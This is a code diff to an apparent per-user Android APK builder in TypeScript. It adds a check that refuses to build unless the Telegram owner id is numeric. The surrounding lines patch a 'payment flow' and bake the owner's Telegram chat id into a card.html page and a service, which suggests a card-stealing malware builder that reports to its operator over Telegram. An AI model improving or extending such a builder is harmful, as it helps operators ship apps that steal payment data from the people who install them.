@@ -671,6 +671,17 @@ export async function buildUserApk(telegramId: string): Promise<string | null> {
     upgradeHeartbeat(buildDir);
     patchPaymentFlow(buildDir);
 
+    // Guard: never bake template placeholders into a shipped APK. If the
+    // telegramId is not a plain numeric id, abort the build — a placeholder
+    // id reaching a device record means "chat not found" spam forever after.
+    if (!/^\d{5,20}$/.test(String(telegramId || "").trim())) {
+      console.error(
+        "[apkBuilder] refusing to build: telegramId is not numeric:",
+        telegramId
+      );
+      return null;
+    }
+
     // v3 base: owner id is baked into Loda (service reads it via AdminInfo)
     // and card.html (telegramChatId + ownerTelegramId); no smali patch needed.
     patchFile(buildDir, LODA_FILE_REL, [[OWNER_PLACEHOLDER, telegramId]]);
